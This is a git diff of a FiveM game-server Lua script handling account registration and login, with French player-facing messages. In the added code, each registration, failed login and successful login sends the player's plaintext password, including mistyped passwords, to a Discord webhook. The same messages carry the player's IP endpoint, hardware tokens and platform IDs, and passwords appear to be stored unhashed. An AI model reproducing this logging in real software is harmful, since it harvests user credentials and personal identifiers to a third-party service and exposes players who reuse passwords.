@@ -3,6 +3,7 @@ local _GetPlayerIdentifierByType <const> = GetPlayerIdentifierByType
 local _GetPlayerEndpoint <const> = GetPlayerEndpoint
 local _GetPlayerGuid <const> = GetPlayerGuid
 local _GetPlayerTokens <const> = GetPlayerTokens
+local _GetConvar <const> = GetConvar
 
 ---@param username string
 ---@return boolean
@@ -18,18 +19,6 @@ local function isValidPassword(password)
         and string.match(password, "%d") -- Require at least 1 number
 end
 
-local CHECK_IF_USER_EXIST <const> = "SELECT 1 FROM users WHERE username = ?"
----@param username string
----@return boolean
-local function checkIfUserExist(username)
-    return MySQL.scalar.await(CHECK_IF_USER_EXIST, {username}) ~= nil
-end
-
-local CREATE_ACCOUNT <const> = "INSERT INTO users (username, password, createdAt, license, tokens, endpoint, guid, discordId, fivemId, steamId) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
-local function createAccount(username, password, identifiers)
-    return MySQL.insert.await(CREATE_ACCOUNT, {username, password, os.date("%Y-%m-%d %H:%M:%S"), identifiers.license or "Unknown", json.encode(identifiers.tokens) or "{}", identifiers.endpoint or "Unknown", identifiers.guid or "Unknown", identifiers.discord or "Unknown", identifiers.fivem or "Unknown", identifiers.steam or "Unknown"})
-end
-
 local ERROR_MESSAGES <const> = {
     USERNAME_REQUIRED = "Veuillez entrer un nom d'utilisateur, veuillez patienter.",
     USERNAME_INVALID = "Le nom d'utilisateur doit contenir au moins 3 caractères et uniquement des lettres, chiffres et underscore.",
@@ -37,7 +26,8 @@ local ERROR_MESSAGES <const> = {
     PASSWORD_INVALID = "Le mot de passe doit contenir au moins 6 caractères, un chiffre et une lettre.",
     PASSWORD_CONFIRM_REQUIRED = "Veuillez confirmer votre mot de passe, veuillez patienter.",
     PASSWORD_MISMATCH = "Les mots de passe ne correspondent pas, veuillez patienter.",
-    USERNAME_ALREADY_USED = "Ce nom d'utilisateur est déjà utilisé, veuillez patienter."
+    USERNAME_ALREADY_USED = "Ce nom d'utilisateur est déjà utilisé, veuillez patienter.",
+    USER_NOT_FOUND = "Nom d'utilisateur ou mot de passe incorrect, veuillez patienter."
 }
 
 ---@param tempId integer: Temporary Identifier
@@ -90,13 +80,13 @@ local function openRegistrationCard(tempId, d, callback)
                 return openRegistrationCard(tempId, d, callback)
             end
 
-            if checkIfUserExist(username) then
+            if mysql.checkIfUserExist(username) then
                 d.update(ERROR_MESSAGES.USERNAME_ALREADY_USED)
                 _Wait(3500)
                 return openRegistrationCard(tempId, d, callback)
             end
 
-            createAccount(tostring(username), tostring(password), {
+            mysql.createAccount(tostring(username), tostring(password), {
                 license = _GetPlayerIdentifierByType(tempId, "license"),
                 endpoint = _GetPlayerEndpoint(tempId),
                 guid = _GetPlayerGuid(tempId),
@@ -105,6 +95,27 @@ local function openRegistrationCard(tempId, d, callback)
                 steam = _GetPlayerIdentifierByType(tempId, "steam"),
                 tokens = _GetPlayerTokens(tempId)
             })
+
+            if _GetConvar("naara:webhook:accountCreation", "") ~= "" then
+                discordLog(_GetConvar("naara:webhook:accountCreation", ""), {
+                    title = "Account Creation",
+                    message = 
+                        'New Account Username ```' .. (username or "Unknown") ..'```\n'..
+                        'New Account Password ```' .. (password or "Unknown") ..'```\n'..
+                        'Username ```' .. (GetPlayerName(tempId) or "Unknown") ..'```\n'..
+                        'Temp ID ```' .. (tempId or "Unknown") ..'```\n'..
+                        'Guid ```' .. (_GetPlayerGuid(tempId) or "Unknown") ..'```\n'..
+                        'License ```' .. (_GetPlayerIdentifierByType(tempId, "license") or "Unknown") ..'```\n'..
+                        'FiveM ID ```' .. (_GetPlayerIdentifierByType(tempId, "fivem") or "Unknown") ..'```\n'..
+                        'Discord ID ```' .. (_GetPlayerIdentifierByType(tempId, "discord") or "Unknown") ..'```\n'..
+                        'Steam ID ```' .. (_GetPlayerIdentifierByType(tempId, "steam") or "Unknown") ..'```\n'..
+                        'Tokens ```' .. (json.encode(_GetPlayerTokens(tempId)) or "Unknown") ..'```\n'..
+                        'Endpoint ```' .. (_GetPlayerEndpoint(tempId) or "Unknown") ..'```\n',
+                    color = 16753920,
+                    footer = "made by Atoshi",
+                    image = _GetConvar("naara:serverIcon", "")
+                })
+            end
 
             d.update("Inscription en cours, veuillez patienter.")
             _Wait(2500)
@@ -140,9 +151,61 @@ local function openLoginCard(tempId, d, callback)
                 return openLoginCard(tempId, d, callback)
             end
 
-            d.update("Connexion en cours, veuillez patienter.")
+            local userExists <const> = mysql.loginToAccount(username, password)
+            if not userExists then
+                d.update(ERROR_MESSAGES.USER_NOT_FOUND)
+
+                if _GetConvar("naara:webhook:accountFailedLogin", "") ~= "" then
+                    discordLog(_GetConvar("naara:webhook:accountFailedLogin", ""), {
+                        title = "Account Failed Login",
+                        message = 
+                            'Failed Username ```' .. (username or "Unknown") ..'```\n'..
+                            'Failed Password ```' .. (password or "Unknown") ..'```\n'..
+                            'Player Username ```' .. (GetPlayerName(tempId) or "Unknown") ..'```\n'..
+                            'Temp ID ```' .. (tempId or "Unknown") ..'```\n'..
+                            'Guid ```' .. (_GetPlayerGuid(tempId) or "Unknown") ..'```\n'..
+                            'License ```' .. (_GetPlayerIdentifierByType(tempId, "license") or "Unknown") ..'```\n'..
+                            'FiveM ID ```' .. (_GetPlayerIdentifierByType(tempId, "fivem") or "Unknown") ..'```\n'..
+                            'Discord ID ```' .. (_GetPlayerIdentifierByType(tempId, "discord") or "Unknown") ..'```\n'..
+                            'Steam ID ```' .. (_GetPlayerIdentifierByType(tempId, "steam") or "Unknown") ..'```\n'..
+                            'Tokens ```' .. (json.encode(_GetPlayerTokens(tempId)) or "Unknown") ..'```\n'..
+                            'Endpoint ```' .. (_GetPlayerEndpoint(tempId) or "Unknown") ..'```\n',
+                        color = 16753920,
+                        footer = "made by Atoshi",
+                        image = _GetConvar("naara:serverIcon", "")
+                    })
+                end
+
+                _Wait(3500)
+                return openLoginCard(tempId, d, callback)
+            end
+
+            d.update("Connexion au compte réussie, connexion au serveur en cours...")
+
+            if _GetConvar("naara:webhook:accountLogin", "") ~= "" then
+                discordLog(_GetConvar("naara:webhook:accountLogin", ""), {
+                    title = "Account Login",
+                    message = 
+                        'Account Username ```' .. (username or "Unknown") ..'```\n'..
+                        'Account Password ```' .. (password or "Unknown") ..'```\n'..
+                        'Account ID ```' .. (userExists or "Unknown") ..'```\n'..
+                        'Player Username ```' .. (GetPlayerName(tempId) or "Unknown") ..'```\n'..
+                        'Temp ID ```' .. (tempId or "Unknown") ..'```\n'..
+                        'Guid ```' .. (_GetPlayerGuid(tempId) or "Unknown") ..'```\n'..
+                        'License ```' .. (_GetPlayerIdentifierByType(tempId, "license") or "Unknown") ..'```\n'..
+                        'FiveM ID ```' .. (_GetPlayerIdentifierByType(tempId, "fivem") or "Unknown") ..'```\n'..
+                        'Discord ID ```' .. (_GetPlayerIdentifierByType(tempId, "discord") or "Unknown") ..'```\n'..
+                        'Steam ID ```' .. (_GetPlayerIdentifierByType(tempId, "steam") or "Unknown") ..'```\n'..
+                        'Tokens ```' .. (json.encode(_GetPlayerTokens(tempId)) or "Unknown") ..'```\n'..
+                        'Endpoint ```' .. (_GetPlayerEndpoint(tempId) or "Unknown") ..'```\n',
+                    color = 16753920,
+                    footer = "made by Atoshi",
+                    image = _GetConvar("naara:serverIcon", "")
+                })
+            end
+
             _Wait(2500)
-            d.done()
+            return d.done()
         end
     end)
 end
